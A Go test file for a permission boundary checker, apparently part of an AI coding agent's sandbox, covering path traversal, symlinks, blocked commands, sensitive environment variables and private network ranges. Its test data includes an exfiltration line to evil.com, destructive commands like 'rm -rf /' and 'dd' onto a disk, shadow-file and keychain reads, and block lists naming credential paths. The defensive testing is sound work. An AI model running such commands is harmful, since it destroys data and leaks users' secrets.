package permissions

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/GrayCodeAI/hawk/internal/home"
)

func TestNewBoundaryChecker(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	if bc == nil {
		t.Fatal("NewBoundaryChecker returned nil")
	}
	if bc.ProjectRoot != "/tmp/testproject" {
		t.Errorf("expected ProjectRoot /tmp/testproject, got %s", bc.ProjectRoot)
	}
	if bc.MaxFileSize != 10*1024*1024 {
		t.Errorf("expected MaxFileSize 10MB, got %d", bc.MaxFileSize)
	}
	if bc.MaxFiles != 50 {
		t.Errorf("expected MaxFiles 50, got %d", bc.MaxFiles)
	}
	if len(bc.BlockedPaths) == 0 {
		t.Error("expected default blocked paths to be populated")
	}
	if len(bc.BlockedCommands) == 0 {
		t.Error("expected default blocked commands to be populated")
	}
}

func TestCheckPath_WithinProject(t *testing.T) {
	dir := t.TempDir()
	bc := NewBoundaryChecker(dir)

	// Valid path within project
	validPath := filepath.Join(dir, "src", "main.go")
	v := bc.CheckPath(validPath)
	if v != nil {
		t.Errorf("expected no violation for valid path, got: %s", FormatViolation(v))
	}
}

func TestCheckPath_OutsideProject(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	// Path outside project
	v := bc.CheckPath("/etc/hosts")
	if v == nil {
		t.Fatal("expected violation for path outside project")
	}
	if v.Type != "path" {
		t.Errorf("expected type 'path', got %s", v.Type)
	}
	if v.Severity != "HIGH" {
		t.Errorf("expected severity HIGH, got %s", v.Severity)
	}
}

func TestCheckPath_Traversal(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	// Path traversal attempt
	v := bc.CheckPath("../../../etc/passwd")
	if v == nil {
		t.Fatal("expected violation for path traversal")
	}
	if v.Type != "path" {
		t.Errorf("expected type 'path', got %s", v.Type)
	}
	if v.Description != "path traversal detected" {
		t.Errorf("expected 'path traversal detected', got %s", v.Description)
	}
	if v.Severity != "CRITICAL" {
		t.Errorf("expected severity CRITICAL, got %s", v.Severity)
	}
}

func TestCheckPath_BlockedPaths(t *testing.T) {
	dir := t.TempDir()
	bc := NewBoundaryChecker(dir)

	// .env within project should be blocked
	envPath := filepath.Join(dir, ".env")
	v := bc.CheckPath(envPath)
	if v == nil {
		t.Fatal("expected violation for .env path")
	}
	if v.Type != "path" {
		t.Errorf("expected type 'path', got %s", v.Type)
	}

	// .git/config within project should be blocked
	gitConfig := filepath.Join(dir, ".git", "config")
	v = bc.CheckPath(gitConfig)
	if v == nil {
		t.Fatal("expected violation for .git/config path")
	}
}

func TestCheckPath_Symlink(t *testing.T) {
	dir := t.TempDir()
	bc := NewBoundaryChecker(dir)

	// Create a symlink that points outside the project
	outsideDir := t.TempDir()
	outsideFile := filepath.Join(outsideDir, "secret.txt")
	if err := os.WriteFile(outsideFile, []byte("secret"), 0o644); err != nil {
		t.Fatal(err)
	}

	symlinkPath := filepath.Join(dir, "link_to_outside")
	if err := os.Symlink(outsideFile, symlinkPath); err != nil {
		// FIXME: symlinks not supported on this platform
		t.Skip("symlinks not supported on this platform")
	}

	v := bc.CheckPath(symlinkPath)
	if v == nil {
		t.Fatal("expected violation for symlink pointing outside project")
	}
	if !strings.Contains(v.Description, "symlink") {
		t.Errorf("expected symlink-related violation, got: %s", v.Description)
	}
}

func TestCheckCommand_Blocked(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	tests := []struct {
		name    string
		cmd     string
		wantNil bool
	}{
		{"sudo", "sudo rm -rf /tmp/foo", false},
		{"su", "su root", false},
		{"doas", "doas cat /etc/shadow", false},
		{"systemctl", "systemctl restart nginx", false},
		{"launchctl", "launchctl load /tmp/foo.plist", false},
		{"rm -rf /", "rm -rf /", false},
		{"chmod 777", "chmod 777 /tmp/foo", false},
		{"dd", "dd if=/dev/zero of=/dev/sda", false},
		{"allowed ls", "ls -la", true},
		{"allowed cat", "cat foo.txt", true},
		{"allowed go build", "go build ./...", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := bc.CheckCommand(tt.cmd)
			if tt.wantNil && v != nil {
				t.Errorf("expected no violation for %q, got: %s", tt.cmd, FormatViolation(v))
			}
			if !tt.wantNil && v == nil {
				t.Errorf("expected violation for %q, got nil", tt.cmd)
			}
		})
	}
}

func TestCheckCommand_PrivilegeEscalation(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	v := bc.CheckCommand("sudo apt install something")
	if v == nil {
		t.Fatal("expected violation for sudo command")
	}
	// sudo is both in blocked commands and caught by privilege escalation;
	// either description is acceptable.
	if v.Description != "privilege escalation attempt" && v.Description != "blocked command" {
		t.Errorf("expected privilege escalation or blocked command violation, got %s", v.Description)
	}
	if v.Severity != "CRITICAL" {
		t.Errorf("expected severity CRITICAL, got %s", v.Severity)
	}
}

func TestCheckCommand_NetworkExfiltration(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	v := bc.CheckCommand("curl https://evil.com/steal-data")
	if v == nil {
		t.Fatal("expected violation for curl command")
	}
	if v.Description != "network exfiltration without approval" {
		t.Errorf("expected 'network exfiltration without approval', got %s", v.Description)
	}

	// Allow curl in allowed commands
	bc2 := NewBoundaryChecker("/tmp/testproject")
	bc2.AllowedCommands = []string{"curl"}
	v = bc2.CheckCommand("curl https://api.example.com/data")
	if v != nil {
		t.Errorf("expected no violation when curl is allowed, got: %s", FormatViolation(v))
	}
}

func TestCheckCommand_ChainedBlocked(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	// Blocked command in pipe
	v := bc.CheckCommand("cat /etc/passwd | sudo tee /etc/shadow")
	if v == nil {
		t.Fatal("expected violation for chained sudo command")
	}
}

func TestCheckCommand_CredentialAccess(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	v := bc.CheckCommand("security find-generic-password -s myservice")
	if v == nil {
		t.Fatal("expected violation for security command")
	}
	if v.Description != "credential access attempt" {
		t.Errorf("expected 'credential access attempt', got %s", v.Description)
	}
}

func TestCheckFileSize(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	// Within limit
	v := bc.CheckFileSize("/tmp/testproject/small.txt", 1024)
	if v != nil {
		t.Errorf("expected no violation for small file, got: %s", FormatViolation(v))
	}

	// Exceeds limit
	v = bc.CheckFileSize("/tmp/testproject/huge.bin", 20*1024*1024)
	if v == nil {
		t.Fatal("expected violation for oversized file")
	}
	if v.Type != "size" {
		t.Errorf("expected type 'size', got %s", v.Type)
	}
	if v.Severity != "MEDIUM" {
		t.Errorf("expected severity MEDIUM, got %s", v.Severity)
	}

	// Exactly at limit
	v = bc.CheckFileSize("/tmp/testproject/exact.bin", 10*1024*1024)
	if v != nil {
		t.Errorf("expected no violation at exact limit, got: %s", FormatViolation(v))
	}
}

func TestCheckFileCount(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.MaxFiles = 3

	// Under limit
	v := bc.CheckFileCount()
	if v != nil {
		t.Errorf("expected no violation under limit, got: %s", FormatViolation(v))
	}

	// Record modifications up to limit
	bc.RecordModification("/tmp/testproject/file1.go")
	bc.RecordModification("/tmp/testproject/file2.go")
	bc.RecordModification("/tmp/testproject/file3.go")

	// At limit
	v = bc.CheckFileCount()
	if v == nil {
		t.Fatal("expected violation at file count limit")
	}
	if v.Type != "count" {
		t.Errorf("expected type 'count', got %s", v.Type)
	}
}

func TestCheckFileCount_DuplicateFiles(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.MaxFiles = 3

	// Recording the same file multiple times should not increase count
	bc.RecordModification("/tmp/testproject/file1.go")
	bc.RecordModification("/tmp/testproject/file1.go")
	bc.RecordModification("/tmp/testproject/file1.go")

	if bc.FilesModified != 1 {
		t.Errorf("expected 1 file modified after duplicates, got %d", bc.FilesModified)
	}
}

func TestCheckEnvironment_Sensitive(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	_ = bc // just to verify it compiles with the struct

	tests := []struct {
		key     string
		blocked bool
	}{
		{"AWS_SECRET_ACCESS_KEY", true},
		{"PRIVATE_KEY_PATH", true},
		{"API_KEY", true},
		{"JWT_SECRET", true},
		{"GITHUB_TOKEN", true},
		{"DATABASE_PASSWORD", true},
		{"GOPATH", false},
		{"EDITOR", false},
		{"TERM", false},
		{"LANG", false},
	}

	checker := NewBoundaryChecker("/tmp/testproject")
	for _, tt := range tests {
		t.Run(tt.key, func(t *testing.T) {
			v := checker.CheckEnvironment(tt.key)
			if tt.blocked && v == nil {
				t.Errorf("expected violation for %s", tt.key)
			}
			if !tt.blocked && v != nil {
				t.Errorf("expected no violation for %s, got: %s", tt.key, FormatViolation(v))
			}
		})
	}
}

func TestCheckEnvironment_DangerousSet(t *testing.T) {
	checker := NewBoundaryChecker("/tmp/testproject")

	dangerousVars := []string{"PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "HOME"}
	for _, key := range dangerousVars {
		t.Run(key, func(t *testing.T) {
			v := checker.CheckEnvironment(key)
			if v == nil {
				t.Errorf("expected violation for setting %s", key)
			}
			if v != nil && v.Type != "env" {
				t.Errorf("expected type 'env', got %s", v.Type)
			}
		})
	}
}

func TestCheckNetwork_PrivateRanges(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	tests := []struct {
		host    string
		port    int
		blocked bool
	}{
		{"10.0.0.1", 80, true},
		{"10.255.255.255", 443, true},
		{"192.168.1.1", 8080, true},
		{"192.168.0.100", 22, true},
		{"172.16.0.1", 443, true},
		{"172.31.255.255", 80, true},
		{"169.254.169.254", 80, true}, // metadata endpoint
		{"8.8.8.8", 53, false},        // public DNS
		{"1.1.1.1", 443, false},       // Cloudflare
		{"93.184.216.34", 80, false},  // example.com
	}

	for _, tt := range tests {
		name := fmt.Sprintf("%s:%d", tt.host, tt.port)
		t.Run(name, func(t *testing.T) {
			v := bc.CheckNetwork(tt.host, tt.port)
			if tt.blocked && v == nil {
				t.Errorf("expected violation for %s", name)
			}
			if !tt.blocked && v != nil {
				t.Errorf("expected no violation for %s, got: %s", name, FormatViolation(v))
			}
		})
	}
}

func TestCheckNetwork_MetadataEndpoint(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	v := bc.CheckNetwork("169.254.169.254", 80)
	if v == nil {
		t.Fatal("expected violation for metadata endpoint")
	}
	if v.Severity != "CRITICAL" {
		t.Errorf("expected severity CRITICAL, got %s", v.Severity)
	}
	if !strings.Contains(v.Description, "metadata") {
		t.Errorf("expected metadata-related description, got: %s", v.Description)
	}
}

func TestCheckNetwork_Localhost(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	// Common dev ports should be allowed on localhost
	v := bc.CheckNetwork("127.0.0.1", 8080)
	if v != nil {
		t.Errorf("expected no violation for localhost:8080, got: %s", FormatViolation(v))
	}

	v = bc.CheckNetwork("127.0.0.1", 3000)
	if v != nil {
		t.Errorf("expected no violation for localhost:3000, got: %s", FormatViolation(v))
	}

	// Uncommon ports on localhost should be blocked
	v = bc.CheckNetwork("127.0.0.1", 12345)
	if v == nil {
		t.Error("expected violation for localhost on non-dev port")
	}
}

func TestIsWithinProject(t *testing.T) {
	dir := t.TempDir()
	bc := NewBoundaryChecker(dir)

	if !bc.IsWithinProject(filepath.Join(dir, "src", "main.go")) {
		t.Error("expected path within project to return true")
	}

	if bc.IsWithinProject("/etc/passwd") {
		t.Error("expected path outside project to return false")
	}

	if bc.IsWithinProject("/tmp/other/file.txt") {
		t.Error("expected path in different directory to return false")
	}
}

func TestRecordModification(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")

	bc.RecordModification("/tmp/testproject/file1.go")
	if bc.FilesModified != 1 {
		t.Errorf("expected 1, got %d", bc.FilesModified)
	}

	bc.RecordModification("/tmp/testproject/file2.go")
	if bc.FilesModified != 2 {
		t.Errorf("expected 2, got %d", bc.FilesModified)
	}

	// Duplicate should not increment
	bc.RecordModification("/tmp/testproject/file1.go")
	if bc.FilesModified != 2 {
		t.Errorf("expected 2 after duplicate, got %d", bc.FilesModified)
	}
}

func TestFormatViolation(t *testing.T) {
	v := &BoundaryViolation{
		Type:        "path",
		Description: "path traversal detected",
		Attempted:   "../../../etc/passwd",
		Allowed:     "must be within /Users/dev/project/",
		Severity:    "CRITICAL",
	}

	formatted := FormatViolation(v)
	if !strings.Contains(formatted, "BOUNDARY VIOLATION") {
		t.Error("expected formatted string to contain 'BOUNDARY VIOLATION'")
	}
	if !strings.Contains(formatted, "path traversal") {
		t.Error("expected formatted string to contain 'path traversal'")
	}
	if !strings.Contains(formatted, "../../../etc/passwd") {
		t.Error("expected formatted string to contain the attempted path")
	}
	if !strings.Contains(formatted, "CRITICAL") {
		t.Error("expected formatted string to contain severity")
	}
}

func TestFormatViolation_Nil(t *testing.T) {
	result := FormatViolation(nil)
	if result != "" {
		t.Errorf("expected empty string for nil violation, got: %s", result)
	}
}

func TestSummary(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.RecordModification("/tmp/testproject/a.go")
	bc.RecordModification("/tmp/testproject/b.go")

	summary := bc.Summary()
	if !strings.Contains(summary, "2 files modified") {
		t.Errorf("expected '2 files modified' in summary, got: %s", summary)
	}
	if !strings.Contains(summary, "limit: 50") {
		t.Errorf("expected 'limit: 50' in summary, got: %s", summary)
	}
	if !strings.Contains(summary, "0 violations") {
		t.Errorf("expected '0 violations' in summary, got: %s", summary)
	}
}

func TestSummary_WithViolations(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.RecordViolation(&BoundaryViolation{
		Type:        "path",
		Description: "test violation",
		Attempted:   "test",
		Allowed:     "test",
		Severity:    "HIGH",
	})

	summary := bc.Summary()
	if !strings.Contains(summary, "1 violations") {
		t.Errorf("expected '1 violations' in summary, got: %s", summary)
	}
}

func TestDefaultBlockedPaths(t *testing.T) {
	paths := DefaultBlockedPaths()
	if len(paths) == 0 {
		t.Fatal("expected non-empty blocked paths")
	}

	expectedPaths := []string{".git/config", ".env", "~/.ssh/", "~/.aws/", "/etc/shadow", "/etc/passwd"}
	for _, expected := range expectedPaths {
		found := false
		for _, p := range paths {
			if p == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected %s in default blocked paths", expected)
		}
	}
}

func TestDefaultBlockedCommands(t *testing.T) {
	cmds := DefaultBlockedCommands()
	if len(cmds) == 0 {
		t.Fatal("expected non-empty blocked commands")
	}

	expectedCmds := []string{"sudo", "su", "doas", "chmod 777", "rm -rf /", "dd", "systemctl", "launchctl"}
	for _, expected := range expectedCmds {
		found := false
		for _, c := range cmds {
			if c == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected %s in default blocked commands", expected)
		}
	}
}

func TestConcurrentAccess(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.MaxFiles = 1000

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			path := fmt.Sprintf("/tmp/testproject/file%d.go", n)
			bc.RecordModification(path)
			bc.CheckFileCount()
			bc.Summary()
		}(i)
	}
	wg.Wait()

	if bc.FilesModified != 100 {
		t.Errorf("expected 100 files modified after concurrent access, got %d", bc.FilesModified)
	}
}

func TestExpandHome(t *testing.T) {
	homeDir, err := os.UserHomeDir()
	// FIXME: test skipped in TestExpandHome
	if err != nil {
		// FIXME: test skipped
		t.Skip("could not get home directory")
	}

	tests := []struct {
		input    string
		expected string
	}{
		{"~/.ssh/", filepath.Join(homeDir, ".ssh/")},
		{"~/.aws/", filepath.Join(homeDir, ".aws/")},
		{"/etc/passwd", "/etc/passwd"},
		{".env", ".env"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result, err := home.Expand(tt.input)
			if err != nil {
				t.Fatalf("home.Expand(%s) error: %v", tt.input, err)
			}
			if result != tt.expected {
				t.Errorf("home.Expand(%s) = %s, want %s", tt.input, result, tt.expected)
			}
		})
	}
}

func TestMatchesBlockedPath(t *testing.T) {
	tests := []struct {
		target  string
		blocked string
		matches bool
	}{
		{"/project/.env", "/project/.env", true},
		{"/project/.env.local", "/project/.env", false},
		{"/project/.git/config", "/project/.git/config", true},
		{"/home/user/.ssh/id_rsa", "/home/user/.ssh/", true},
		{"/home/user/.ssh/known_hosts", "/home/user/.ssh/", true},
		{"/project/src/main.go", "/project/.env", false},
		{"", "/project/.env", false},
		{"/project/.env", "", false},
	}

	for _, tt := range tests {
		name := fmt.Sprintf("%s_vs_%s", tt.target, tt.blocked)
		t.Run(name, func(t *testing.T) {
			result := matchesBlockedPath(tt.target, tt.blocked)
			if result != tt.matches {
				t.Errorf("matchesBlockedPath(%s, %s) = %v, want %v", tt.target, tt.blocked, result, tt.matches)
			}
		})
	}
}

func TestBoundaryChecker_CustomLimits(t *testing.T) {
	bc := NewBoundaryChecker("/tmp/testproject")
	bc.MaxFileSize = 1024 // 1KB
	bc.MaxFiles = 5

	// Test custom file size limit
	v := bc.CheckFileSize("/tmp/testproject/file.txt", 2048)
	if v == nil {
		t.Error("expected violation for file exceeding custom 1KB limit")
	}

	// Test custom file count limit
	for i := 0; i < 5; i++ {
		bc.RecordModification(fmt.Sprintf("/tmp/testproject/file%d.go", i))
	}
	v = bc.CheckFileCount()
	if v == nil {
		t.Error("expected violation at custom file count limit of 5")
	}
}
